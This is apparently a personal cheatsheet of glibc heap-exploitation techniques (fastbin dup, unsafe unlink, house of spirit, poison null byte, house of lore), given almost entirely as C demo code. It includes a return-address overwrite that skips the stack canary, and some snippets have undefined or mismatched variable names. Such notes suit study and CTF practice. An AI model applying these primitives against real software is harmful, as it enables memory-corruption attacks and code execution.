---
title: "Binex Heap"
description: "Cheatsheet"
date: "2025-8-3"
---
## fastbin_dup
### prerequisites
- fill tcache (7 chunks)
### advantages
- can write to arbitrary address

```c
free(a);
// free(a); // would crash here
free(b);
free(a);

c = malloc();
d = malloc();
//heap is allocated and in the bins at the same time
e = malloc();
assert(c == e);
```

## fastbin_dup_into_stack
```c
free(heap);
free(a);
free(heap);
//double free

heap = malloc();
c = malloc();
//heap chunk is allocated and in the bins at the same time

unsigned long stack[4];
stack[1] = 0x20;

heap[0] = (heap >> 12) ^ &stack[2]; //control the next pointer to point to stack variable

heap = malloc(); // HEAD pointer points to stack variable

vuln = malloc(); // get the stack allocation

assert(vuln == &stack_var[2]);
```

## fastbin_dup_consolidate (idk)
```c
#define CHUNK_SIZE 0x400
//---
void *ptr[7];

void *p1 = malloc(0x40);

free(p1); // to fastbin

void *p2 = malloc(CHUNK_SIZE); // trigger consolidate
assert(p1 == p2);

free(p1); // vulnerability (double free)

void *p3 = malloc(CHUNK_SIZE);

assert(p3 == p2);
```
## unsafe_unlink
```c
int malloc_size = 0x420; //we want to be big enough not to use tcache or fastbin
int header_size = 2;

chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1

//fake free chunk inside chunk0
chunk0_ptr[1] = chunk0_ptr[-1] - 0x10; //prev_size
chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3); //fd points to stack
chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2); //bk points to stack

uint64_t *chunk1_hdr = chunk1_ptr - header_size; //get chunk1 header
chunk1_hdr[0] = malloc_size; //prev_size
chunk1_hdr[1] &= ~1; //clear inuse bit
free(chunk1_ptr); // then, chunk0_ptr no longer points to heap

// unlink in the background
// chunk0_ptr = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2)
// chunk0_ptr = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
// yes, its overwritten twice

char victim_string[8];
strcpy(victim_string,"Hello!~");
chunk0_ptr[3] = (uint64_t) victim_string; // chunk0_ptr = victim_string

chunk0_ptr[0] = 0x4141414142424242LL;
assert(*(long *)victim_string == 0x4141414142424242L);
```

## house_of_spirit
```c
long fake_chunks[10] __attribute__((aligned(0x10)));
fake_chunks[1] = 0x40; // size
fake_chunks[9] = 0x1234; // nextsize
void *victim = &fake_chunks[2];
free(victim); //to fastbin
void *allocated = calloc(1, 0x30); //from fastbin
```

## poison_null_byte
```c
void *tmp = malloc(0x1);
void *heap_base = (void *)((long)tmp & (~0xfff));
size_t size = 0x10000 - ((long)tmp&0xffff) - 0x20; //to make fake address like 0x??0010
void *padding= malloc(size);

void *prev = malloc(0x500);
void *victim = malloc(0x4f0);
malloc(0x10);//barrier
void *a = malloc(0x4f0);
malloc(0x10);//barrier
void *b = malloc(0x510);
malloc(0x10);//barrier
puts("\ncurrent heap layout\n"
     "    ... ...\n"
     "padding\n"
     "    prev chunk(addr=0x??0010, size=0x510)\n"
     "  victim chunk(addr=0x??0520, size=0x500)\n"
     " barrier chunk(addr=0x??0a20, size=0x20)\n"
     "       a chunk(addr=0x??0a40, size=0x500)\n"
     " barrier chunk(addr=0x??0f40, size=0x20)\n"
     "       b chunk(addr=0x??0f60, size=0x520)\n"
     " barrier chunk(addr=0x??1480, size=0x20)\n");

// move them to the unsorted bin
free(a);
free(b);
free(prev);

malloc(0x1000); // move them from unsorted bin to the (sorted) largebin to reuse _nextsize as fd/bk later

void *prev2 = malloc(0x500); //reallocate prev
((long *)prev)[1] = 0x501; //construct fake chunk
*(long *)(prev + 0x500) = 0x500; //overwrite victim prev_size

void *b2 = malloc(0x510);
((char*)b2)[0] = '\x10';
((char*)b2)[1] = '\x00';  // b->fd <- fake_chunk (0x??0010) [from 0x??0a40 (a)]

void *a2 = malloc(0x4f0);
free(a2); // to unsorted bin
free(victim); //to unsorted bin: a->bck = victim

void *a3 = malloc(0x4f0);
((char*)a3)[8] = '\x10';
((char*)a3)[9] = '\x00'; // a->bk <- fake_chunk (0x??0010) [from 0x??0520 (victim)]

((char *)victim2)[-8] = '\x00';//overwrite victim prev_size (again)

free(victim); // to unsorted bin, consolidate (merge) with prev

void *merged = malloc(0x100); // 0x??0020, prev2 (0x??0010)
memset(merged, 'a', 0x80);
memset(prev2, 'c', 0x80);
assert(strstr(merged, "CCCCCCCCC"));
```
## house_of_lore
```c

intptr_t *stack_buffer_1[4] = {0};
intptr_t *stack_buffer_2[4] = {0};
void *fake_freelist[7][4];

intptr_t *victim = malloc(0x100);

// for tcache
void *dummies[7];
for (int i = 0; i < 7; i++)
dummies[i] = malloc(0x100);

intptr_t *victim_chunk = victim - 2;

// prepare the fake freelist
for (int i = 0; i < 6; i++) {
fake_freelist[i][3] = fake_freelist[i + 1];
}
fake_freelist[6][3] = NULL;

// sb1.fd = victim_chunk;
// sb1 -> victim_chunk
stack_buffer_1[0] = 0;
stack_buffer_1[1] = 0;
stack_buffer_1[2] = victim_chunk;

// sb1.bk = stack_buffer_2;
// sb2.fd = stack_buffer_1;
// sb2.bk = fake_freelist[0];
// ff0 <-> sb2 <-> sb1
stack_buffer_1[3] = (intptr_t *)stack_buffer_2;
stack_buffer_2[2] = (intptr_t *)stack_buffer_1;
stack_buffer_2[3] = (intptr_t *)fake_freelist[0];

//avoid the consolidation
void *p5 = malloc(1000);

// fill tcache
for (int i = 0; i < 7; i++)
free(dummies[i]);

// free victim to put it into the smallbin
free((void *)victim);


// idk
void *p2 = malloc(1200);
//------------VULNERABILITY-----------

// in the fastbin
victim[1] = (intptr_t)stack_buffer_1; // victim->bk is pointing to stack

//------------------------------------
// empty the tcache
for (int i = 0; i < 7; i++)
malloc(0x100);

// move the fake freelist into the tcache
void *p3 = malloc(0x100);

// get the stack allocated
char *p4 = malloc(0x100);
intptr_t sc = (intptr_t)win; // Emulating our in-memory shellcode

long offset = (long)__builtin_frame_address(0) - (long)p4;
memcpy(
  (p4 + offset + 8), &sc,
  8); // This bypasses stack-smash detection since it jumps over the canary

// sanity check
assert((long)__builtin_return_address(0) == (long)win);
```
